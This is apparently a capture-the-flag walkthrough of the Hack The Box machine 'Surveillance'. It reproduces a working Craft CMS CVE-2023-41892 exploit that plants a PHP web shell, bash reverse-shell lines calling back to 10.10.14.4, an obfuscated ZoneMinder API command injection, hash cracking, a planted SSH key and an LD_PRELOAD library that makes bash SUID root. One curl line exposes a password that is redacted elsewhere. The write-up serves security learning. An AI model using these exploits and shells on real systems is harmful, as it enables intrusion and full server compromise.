# Surveillance

![surveillance_machine_info_card](./assets/surveillance_machine_info_card.png)

Machine: [https://app.hackthebox.com/machines/Surveillance](https://app.hackthebox.com/machines/Surveillance)

Created by: [TheCyberGeek](https://app.hackthebox.com/users/114053) & [TRX](https://app.hackthebox.com/users/31190)

Difficulty: Medium

OS: Linux

## Machine Info

Surveillance is a medium-difficulty Linux machine that showcases a vulnerability (`[CVE-2023-41892](https://nvd.nist.gov/vuln/detail/CVE-2023-41892)`) in Craft CMS, which abuses PHP object injection to inject PHP content into the Craft CMS web log files to gain Remote Code Execution (RCE). The privilege escalation abuses ZoneMinder with an authenticated remote code injection in the `HostController.php` API endpoint to gain a shell as the `zoneminder` user. As this user, a `sudo` entry is abused by adding a configuration environment variable `LD_PRELOAD` via the admin panel and loading the malicious library file through `zmdc.dl` on the target, compromising the system.

## Enumeration

### Nmap

```shell
labadmin@labmachine:~/surveillance$ nmap -p- --min-rate 1000 -oN surveillance-default-nmap.log 10.10.11.245
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-17 17:56 PDT
Warning: 10.10.11.245 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.11.245
Host is up (0.26s latency).
Not shown: 62367 closed tcp ports (conn-refused), 3166 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 190.91 seconds

labadmin@labmachine:~/surveillance$ nmap -p 22,80 -sV -sC -oN surveillance-sv-sc-nmap.log 10.10.11.245
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-17 18:00 PDT
Nmap scan report for 10.10.11.245
Host is up (0.48s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://surveillance.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.97 seconds
```

Nmap reveals 2 open ports.

- 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
- 80/tcp open  http    nginx 1.18.0 (Ubuntu)

The host is most likely running Ubuntu 22.04 jammy, based on the version of [openssh-server](https://packages.ubuntu.com/search?keywords=openssh-server).

We also see that our environment does not follow `http://surveillance.htb/` redirect, so we add that to `/etc/hosts`.

```shell
labadmin@labmachine:~/surveillance$ sudo bash -c 'echo "10.10.11.245  surveillance.htb" >> /etc/hosts'

labadmin@labmachine:~/surveillance$ grep surveillance.htb /etc/hosts
10.10.11.245  surveillance.htb
```

### HTTP port 80

We start browse to `http://surveillance.htb/`.

![surveillance1](./assets/surveillance1.png)

The `Home`, `About`, `Services` and `Contact Us` links are anchors and keep us on the same web page.

Scrolling to bottom of page we find it is hosting and instance of CMS, [Craft CMS](https://craftcms.com/).

![surveillance2](./assets/surveillance2.png)

Reading the page source code we find out it is running `Craft CMS` version 4.4.14.

```html
  <section class="footer_section">
    <div class="container">
      <p>
        &copy; <span id="displayYear"></span> All Rights Reserved By
        SURVEILLANCE.HTB</a><br> <b>Powered by <a href="https://github.com/craftcms/cms/tree/4.4.14"/>Craft CMS</a></b>
      </p>
    </div>
  </section>
```

## Foothold

Searching online we find a Remote Code Execution (RCA)vulnerability [NIST - CVE-2023-41892](https://nvd.nist.gov/vuln/detail/CVE-2023-41892).

[GitHub Craft CMS Security Advisories](https://github.com/craftcms/cms/security/advisories/GHSA-4w8r-3xrw-v25g)

During our search we also found following Gist that provides a Proof-of-Concept (POC) for [CVE-2023-41892-POC](https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226)

Studying the code we can follow the flow.

Define request header with browser data to obfuscate request to look as it comes from a browser.

```python
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36"
}
```

Send request to execute `phpinfo` on target host and parse temporary upload directory and DOCUMENT_ROOT.

```python
def getTmpUploadDirAndDocumentRoot():
    data = {
        "action": "conditions/render",
        "configObject[class]": "craft\elements\conditions\ElementCondition",
        "config": r'{"name":"configObject","as ":{"class":"\\GuzzleHttp\\Psr7\\FnStream", "__construct()":{"methods":{"close":"phpinfo"}}}}'
    }

    response = requests.post(url, headers=headers, data=data)

    pattern1 = r'<tr><td class="e">upload_tmp_dir<\/td><td class="v">(.*?)<\/td><td class="v">(.*?)<\/td><\/tr>'
    pattern2 = r'<tr><td class="e">\$_SERVER\[\'DOCUMENT_ROOT\'\]<\/td><td class="v">([^<]+)<\/td><\/tr>'
   
    match1 = re.search(pattern1, response.text, re.DOTALL)
    match2 = re.search(pattern2, response.text, re.DOTALL)
    return match1.group(1), match2.group(1)
```

Write the payload that allows command execution to `shell.php` and upload to target server.

```python
def writePayloadToTempFile(documentRoot):

    data = {
        "action": "conditions/render",
        "configObject[class]": "craft\elements\conditions\ElementCondition",
        "config": '{"name":"configObject","as ":{"class":"Imagick", "__construct()":{"files":"msl:/etc/passwd"}}}'
    }

    files = {
        "image1": ("pwn1.msl", """<?xml version="1.0" encoding="UTF-8"?>
        <image>
        <read filename="caption:&lt;?php @system(@$_REQUEST['cmd']); ?&gt;"/>
        <write filename="info:DOCUMENTROOT/cpresources/shell.php" />
        </image>""".replace("DOCUMENTROOT", documentRoot), "text/plain")
    }

    response = requests.post(url, headers=headers, data=data, files=files)
```

Use Imagick to move the `shell.php` to DOCUMENT_ROOT.

```python
def trigerImagick(tmpDir):
    
    data = {
        "action": "conditions/render",
        "configObject[class]": "craft\elements\conditions\ElementCondition",
        "config": '{"name":"configObject","as ":{"class":"Imagick", "__construct()":{"files":"vid:msl:' + tmpDir + r'/php*"}}}'
    }
    response = requests.post(url, headers=headers, data=data)   
```

Request the `shell.php` with command for remote execution and print command response.

```python
def shell(cmd):
    response = requests.get(url + "/cpresources/shell.php", params={"cmd": cmd})
    match = re.search(r'caption:(.*?)CAPTION', response.text, re.DOTALL)

    if match:
        extracted_text = match.group(1).strip()
        print(extracted_text)
    else:
        return None
    return extracted_text
```

Main function that will check that user provided web page URL. And then call the above functions in order.

```python
if __name__ == "__main__":
    if(len(sys.argv) != 2):
        print("Usage: python CVE-2023-41892.py <url>")
        exit()
    else:
        url = sys.argv[1]
        print("[-] Get temporary folder and document root ...")
        upload_tmp_dir, documentRoot = getTmpUploadDirAndDocumentRoot()
        tmpDir = "/tmp" if "no value" in upload_tmp_dir else upload_tmp_dir
        print("[-] Write payload to temporary file ...")
        try:
            writePayloadToTempFile(documentRoot)
        except requests.exceptions.ConnectionError as e:
            print("[-] Crash the php process and write temp file successfully")

        print("[-] Trigger imagick to write shell ...")
        try:
            trigerImagick(tmpDir)
        except:
            pass

        print("[-] Done, enjoy the shell")
        while True:
            cmd = input("$ ")
            shell(cmd)```
```

After making sure the code is not malicious to us we execute it and successfully get shell.

```shell
labadmin@labmachine:~/surveillance$ python3 CVE-2023-41892-POC.py 'http://surveillance.htb'
[-] Get temporary folder and document root ...
[-] Write payload to temporary file ...
[-] Crash the php process and write temp file successfully
[-] Trigger imagick to write shell ...
[-] Done, enjoy the shell
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$
```

As the next step we setup a reverse shell, starting with local Netcat listener.

```shell
labadmin@labmachine:~$ nc -lvnp 6000
Listening on 0.0.0.0 6000
```

And connect to the local listener from target machine.

```shell
$ which bash
/usr/bin/bash
$ /usr/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.4/6000 0>&1'
```

And we get connection to our local Netcat listener.

```shell
labadmin@labmachine:~$ nc -lvnp 6000
Listening on 0.0.0.0 6000
Connection received on 10.10.11.245 37058
bash: cannot set terminal process group (1086): Inappropriate ioctl for device
bash: no job control in this shell
www-data@surveillance:~/html/craft/web/cpresources$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@surveillance:~/html/craft/web/cpresources$
```

To stabilize the shell we use script to create a new PTY.

```
www-data@surveillance:~/html/craft/cpresources$ script /dev/null -c bash
```

Having a look in `/etc/passwd` we find 2 users.

```shell
www-data@surveillance:/$ cat /etc/passwd
cat /etc/passwd
[OMITTED]
matthew:x:1000:1000:,,,:/home/matthew:/bin/bash
mysql:x:114:122:MySQL Server,,,:/nonexistent:/bin/false
zoneminder:x:1001:1001:,,,:/home/zoneminder:/bin/bash
[OMITTED]
www-data@surveillance:/$
```

As expected we don't have permission to read their home directory.

```shell
www-data@surveillance:/$ ls -l /home/matthew
ls -l /home/matthew
ls: cannot open directory '/home/matthew': Permission denied
www-data@surveillance:/$ ls -l /home/zoneminder
ls -l /home/zoneminder
ls: cannot open directory '/home/zoneminder': Permission denied
www-data@surveillance:/$
```

## Backup Files

Continuing exploring and we find a backup of a SQL database.

```shell
www-data@surveillance:~/html/craft/storage/backups$ pwd
pwd
/var/www/html/craft/storage/backups
www-data@surveillance:~/html/craft/storage/backups$ ls -ltr
ls -ltr
total 20
-rw-r--r-- 1 root root 19918 Oct 17  2023 surveillance--2023-10-17-202801--v4.4.14.sql.zip
www-data@surveillance:~/html/craft/storage/backups$
```

Since we know that the target host has python we will start a python web server on the target machine and download the file locally.

```shell
www-data@surveillance:~/html/craft/storage/backups$ /usr/bin/python3 -m http.server 8000
<orage/backups$ /usr/bin/python3 -m http.server 8000
```

Now we download it locally with wget.

```shell
labadmin@labmachine:~/surveillance$ wget http://surveillance.htb:8000/surveillance--2023-10-17-202801--v4.4.14.sql.zip
--2024-04-18 00:50:20--  http://surveillance.htb:8000/surveillance--2023-10-17-202801--v4.4.14.sql.zip
Resolving surveillance.htb (surveillance.htb)... 10.10.11.245
Connecting to surveillance.htb (surveillance.htb)|10.10.11.245|:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 19918 (19K) [application/zip]
Saving to: ‘surveillance--2023-10-17-202801--v4.4.14.sql.zip’

surveillance--2023-10-17-202801--v4.4.14.sql.zip    100%[=================================================================================================================>]  19.45K  67.9KB/s    in 0.3s

2024-04-18 00:50:21 (67.9 KB/s) - ‘surveillance--2023-10-17-202801--v4.4.14.sql.zip’ saved [19918/19918]
```

We unzip and find out it is a ASCII text file.

```shell
labadmin@labmachine:~/surveillance$ unzip surveillance--2023-10-17-202801--v4.4.14.sql.zip
Archive:  surveillance--2023-10-17-202801--v4.4.14.sql.zip
  inflating: surveillance--2023-10-17-202801--v4.4.14.sql

labadmin@labmachine:~/surveillance$ file surveillance--2023-10-17-202801--v4.4.14.sql
surveillance--2023-10-17-202801--v4.4.14.sql: ASCII text
```

Now we open the file in `vi` and investigate. After searching for `Matthew` we found the following entry containing a hash.

```shell
--
-- Dumping data for table `users`
--

LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
set autocommit=0;
INSERT INTO `users` VALUES (1,NULL,1,0,0,0,1,'admin','Matthew B','Matthew','B','admin@surveillance.htb','[OMITTED]','2023-10-17 20:22:34',NULL,NULL,NULL,'2023-10-11 18:58:57',NULL,1,NULL,NULL,NULL,0,'2023-10-17 20:27:46','2023-10-11 17:57:16','2023-10-17 20:27:46');
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;
commit;
```

The hash looks exactly as a sha256 hash so we use hashcat to try crack it.

We start add the hash in a file.

```shell
echo '[OMITTED]' > matthew.hash
```

Next we check hashcat `hash-mode` from `hashcat --help` or their [Hashcat - WIKI](https://hashcat.net/wiki/doku.php?id=hashcat)

```shell
   1400 | SHA2-256                                                   | Raw Hash
```

We use the hash-mode `-m 1400` and run with `rockyou.txt` word list the password is successfully cracked.

```labadmin@labmachine:~/surveillance$ hashcat -a 0 -m 1400 matthew.hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

[OMITTED]
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

[OMITTED]:[OMITTED]

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1400 (SHA2-256)
[OMITTED]
```

Finally with login the host using matthew credentials and get the user flag.

```shell
labadmin@labmachine:~$ ssh matthew@10.10.11.245
[OMITTED]
matthew@surveillance:~$ pwd
/home/matthew
matthew@surveillance:~$ ls -la
total 36
drwxrwx--- 5 matthew matthew 4096 Apr 18 08:35 .
drwxr-xr-x 4 root    root    4096 Oct 17  2023 ..
lrwxrwxrwx 1 matthew matthew    9 May 30  2023 .bash_history -> /dev/null
-rw-r--r-- 1 matthew matthew  220 Apr 21  2023 .bash_logout
-rw-r--r-- 1 matthew matthew 3771 Apr 21  2023 .bashrc
drwx------ 2 matthew matthew 4096 Sep 19  2023 .cache
drwx------ 3 matthew matthew 4096 Apr 18 07:51 .gnupg
-rw-r--r-- 1 matthew matthew  807 Apr 21  2023 .profile
drwx------ 2 matthew matthew 4096 Apr 18 09:03 .ssh
-rw-r----- 1 root    matthew   33 Apr 18 07:47 user.txt
matthew@surveillance:~$ cat user.txt
[OMITTED]
```

## Lateral Movement

### ZoneMinder

Using `netstat` we find an internal web application listening on port `8080`.

```shell
matthew@surveillance:~$ netstat -tnlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

We setup a local port forward by setup a second ssh connection.

```shell
labadmin@labmachine:~/surveillance$ ssh -L 8080:127.0.0.1:8080 matthew@10.10.11.245
```

Navigating to  http://localhost:8080 and we get a [ZoneMinder](https://zoneminder.com/) login page.

![surveillance3](./assets/surveillance3.png)

Default credentials `admin/admin` as mentioned in the [user guide](https://github.com/ZoneMinder/ZoneMinder/blob/master/docs/userguide/gettingstarted.rst) does not work.

Trying `admin/[OMITTED]` and we are in.

![surveillance4](./assets/surveillance4.png)

In the upper right we see it is running ZoneMinder version `v1.36.32`. And searching online we find vulnerability [https://nvd.nist.gov/vuln/detail/CVE-2023-26035](https://nvd.nist.gov/vuln/detail/CVE-2023-26035). And we also find an exploit in [Metasploit](https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/unix/webapp/zoneminder_snapshots.rb). And the vulnerable code we found here at [GitHub - ZoneMinder](https://github.com/ZoneMinder/zoneminder/commit/3bd58d8393fba06f17e013c33b3d44442e3e5be2).

To start with we need to get a `access_token` as described in the [ZoneMinder - API](https://zoneminder.readthedocs.io/en/stable/api.html#getting-an-api-key).

```shell
labadmin@labmachine:~/surveillance$ curl -s -X POST -d "user=admin&pass=starcraft122490" http://127.0.0.1:8080/api/host/login.json | python3 -m json.tool
{
    "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJab25lTWluZGVyIiwiaWF0IjoxNzE0NTQ5OTU3LCJleHAiOjE3MTQ1NTcxNTcsInVzZXIiOiJhZG1pbiIsInR5cGUiOiJhY2Nlc3MifQ.dP9P6Zm9Z4fI2dWZYwPFswLKMVZ3LemjBUEqXfw6shg",
    "access_token_expires": 7200,
    "refresh_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJab25lTWluZGVyIiwiaWF0IjoxNzE0NTQ5OTU3LCJleHAiOjE3MTQ2MzYzNTcsInVzZXIiOiJhZG1pbiIsInR5cGUiOiJyZWZyZXNoIn0.LcbIVbav4MMCx0JpEIlmlLOrDYy633Ewi70VJJwfdNM",
    "refresh_token_expires": 86400,
    "credentials": "auth=",
    "append_password": 0,
    "version": "1.36.32",
    "apiversion": "2.0"
}
```

From the vulnerable source code we know a daemon named 
zmdc.dl. So as the next step we inject the command parameter and execute code on the target.

First we base64 encode the reverse shell command.

```shell
labadmin@labmachine:~/surveillance$ echo 'bash -i >& /dev/tcp/10.10.14.4/6001 0>&1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzYwMDEgMD4mMQo=
```

And then we must URL-encode the entire payload.

```shell
$(echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzYwMDEgMD4mMQo="|base64 -d|bash)
```

Next we start the local Netcat listener.

```shell
labadmin@labmachine:~/surveillance$ nc -lvnp 6001
Listening on 0.0.0.0 6001
```

The URL-encoded payload must be set to the `/$command` section of the URL, which we recall is as follows.

```shell
// invocation: 
https://server/zm/api/host/daemonControl/<daemon>.pl/<command>.json
```

Finally we create the request.

```shell
labadmin@labmachine:~/surveillance$ curl -XGET http://127.0.0.1:8080/api/host/daemonControl/zmdc.pl/%24%28echo%20%22YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC40LzYwMDEgMD4mMQo%3D%22%7Cbase64%20-d%7Cbash%29.json?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJab25lTWluZGVyIiwiaWF0IjoxNzE0NTQ5OTU3LCJleHAiOjE3MTQ1NTcxNTcsInVzZXIiOiJhZG1pbiIsInR5cGUiOiJhY2Nlc3MifQ.dP9P6Zm9Z4fI2dWZYwPFswLKMVZ3LemjBUEqXfw6sh
```

Back to the listener and we have the reverse shell as `zoneminder`.

```shell
labadmin@labmachine:~/surveillance$ nc -lvnp 6001
Listening on 0.0.0.0 6001
Connection received on 10.10.11.245 52920
bash: cannot set terminal process group (1088): Inappropriate ioctl for device
bash: no job control in this shell
zoneminder@surveillance:/usr/share/zoneminder/www/api/app/webroot$ id
id
uid=1001(zoneminder) gid=1001(zoneminder) groups=1001(zoneminder)
zoneminder@surveillance:/usr/share/zoneminder/www/api/app/webroot$
```

And we upgrade the shell.

```shell
zoneminder@surveillance:/usr/share/zoneminder/www/api/app/webroot$  script /dev/null -c bash
<nder/www/api/app/webroot$  script /dev/null -c bash
Script started, output log file is '/dev/null'.
zoneminder@surveillance:/usr/share/zoneminder/www/api/app/webroot$
```

As last step we setup a shell over SSH.

Generate ssh key locally.

```shell
labadmin@labmachine:~/surveillance$ ssh-keygen -f ./id_ed25519 -N "" -C na
Generating public/private ed25519 key pair.
Your identification has been saved in ./id_ed25519
Your public key has been saved in ./id_ed25519.pub
The key fingerprint is:
SHA256:l+ut6oSyaz4pL4ZyN2GhEXxirgcBdmNTjgAS9HK78sw na
The key's randomart image is:
+--[ED25519 256]--+
|O* =..           |
|+ X *            |
| = B .           |
|. = o      .     |
| o + .  S o      |
|. o +  . . .     |
| + o.o. . .      |
|o X *o . . .     |
|.o E=+ .o.o..    |
+----[SHA256]-----+

labadmin@labmachine:~/surveillance$ cat id_ed25519.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH93lXrXAivIx0OHDfLIlgqfY+9re3meTi4rXqPaVgfK na
```

On target host we create .ssh directory and add key to `authorized_keys`.

```
zoneminder@surveillance:~$ pwd
pwd
/home/zoneminder
zoneminder@surveillance:~$ mkdir .ssh
mkdir .ssh
zoneminder@surveillance:~$ chmod 700 .ssh
chmod 700 .ssh
zoneminder@surveillance:~$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH93lXrXAivIx0OHDfLIlgqfY+9re3meTi4rXqPaVgfK' > ~/.ssh/authorized_keys
<IlgqfY+9re3meTi4rXqPaVgfK' > ~/.ssh/authorized_keys
zoneminder@surveillance:~$
```

Back to the local machine and we can now ssh to the target host as zoneminder.

```shell
labadmin@labmachine:~/surveillance$ ssh -i ./id_ed25519 zoneminder@10.10.11.245
[OMITTED]
zoneminder@surveillance:~$ id
uid=1001(zoneminder) gid=1001(zoneminder) groups=1001(zoneminder)
zoneminder@surveillance:~$
```

## Privilege Escalation

Checking sudo permissions we find out that we can execute any of the zm scripts.

```shell
zoneminder@surveillance:/usr/share/zoneminder/www$ sudo -l
sudo -l
Matching Defaults entries for zoneminder on surveillance:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User zoneminder may run the following commands on surveillance:
    (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *
zoneminder@surveillance:/usr/share/zoneminder/www$
```

They are perl scripts and we find them under `/usr/bin/zm*.pl`.

```shell
zoneminder@surveillance:~$ ls -la /usr/bin/zm*.pl
-rwxr-xr-x 1 root root 43027 Nov 23  2022 /usr/bin/zmaudit.pl
-rwxr-xr-x 1 root root 12939 Nov 23  2022 /usr/bin/zmcamtool.pl
-rwxr-xr-x 1 root root  6043 Nov 23  2022 /usr/bin/zmcontrol.pl
-rwxr-xr-x 1 root root 26232 Nov 23  2022 /usr/bin/zmdc.pl
-rwxr-xr-x 1 root root 35206 Nov 23  2022 /usr/bin/zmfilter.pl
-rwxr-xr-x 1 root root  5640 Nov 23  2022 /usr/bin/zmonvif-probe.pl
-rwxr-xr-x 1 root root 19386 Nov 23  2022 /usr/bin/zmonvif-trigger.pl
-rwxr-xr-x 1 root root 13994 Nov 23  2022 /usr/bin/zmpkg.pl
-rwxr-xr-x 1 root root 17492 Nov 23  2022 /usr/bin/zmrecover.pl
-rwxr-xr-x 1 root root  4815 Nov 23  2022 /usr/bin/zmstats.pl
-rwxr-xr-x 1 root root  2133 Nov 23  2022 /usr/bin/zmsystemctl.pl
-rwxr-xr-x 1 root root 13111 Nov 23  2022 /usr/bin/zmtelemetry.pl
-rwxr-xr-x 1 root root  5340 Nov 23  2022 /usr/bin/zmtrack.pl
-rwxr-xr-x 1 root root 18482 Nov 23  2022 /usr/bin/zmtrigger.pl
-rwxr-xr-x 1 root root 45421 Nov 23  2022 /usr/bin/zmupdate.pl
-rwxr-xr-x 1 root root  8205 Nov 23  2022 /usr/bin/zmvideo.pl
-rwxr-xr-x 1 root root  7022 Nov 23  2022 /usr/bin/zmwatch.pl
-rwxr-xr-x 1 root root 19655 Nov 23  2022 /usr/bin/zmx10.pl
```

Browsing through the ZoneMinder web site, in the `Options` menu under `Config`, we find `LD_PRELOAD`. And clicking the question mark we get the config description.

![surveillance5](./assets/surveillance5.png)

```text
ZM_LD_PRELOAD

Some older cameras require the use of the v4l1 compact library. This setting allows the setting of the path to the library, so that it can be loaded by zmdc.pl before launching zmc
```

Here we create a malicious shared object library, which will be loaded with 
root permissions when we run `zmdc.pl` using sudo. 

We set the option to `/tmp/shell.so` and save.

![surveillance6](./assets/surveillance6.png)

Next we create the shell.c file and compile.

```C
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
    void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("chmod u+s /bin/bash");
}
```

Compile and transfer to the target machine.

```shell
labadmin@labmachine:~/surveillance$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
shell.c: In function ‘_init’:
shell.c:6:5: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
    6 |     setgid(0);
      |     ^~~~~~
shell.c:7:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
    7 |     setuid(0);
      |     ^~~~~~

labadmin@labmachine:~/surveillance$ scp -i ./id_ed25519 shell.so zoneminder@10.10.11.245:/tmp/
shell.so                                                                              100%   14KB  34.8KB/s   00:00
```

Once it is executed it will add the `SUID` bit to `/bin/bash`, that will enable a privilege escalation to root.

```shell
zoneminder@surveillance:/tmp$ sudo zmdc.pl
No command given
Usage:
    zmdc.pl {command} [daemon [options]]

Options:
    {command} - One of 'startup|shutdown|status|check|logrot' or
    'start|stop|restart|reload|version'. [daemon [options]] - Daemon name
    and options, required for second group of commands

zoneminder@surveillance:/tmp$ sudo zmdc.pl startup zmdc
Starting server
zoneminder@surveillance:/tmp$
```

Confirming the changed permissions of `/bin/bash` and we see that it has SUID permissions

```shell
zoneminder@surveillance:/tmp$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash
```

Finally we execute a `SUID` shell giving us root and we find the flag under /root

```shell
zoneminder@surveillance:/tmp$ /bin/bash -p
bash-5.1# id
uid=1001(zoneminder) gid=1001(zoneminder) euid=0(root) groups=1001(zoneminder)
bash-5.1# cat /root/root.txt
[OMITTED]
bash-5.1#
```
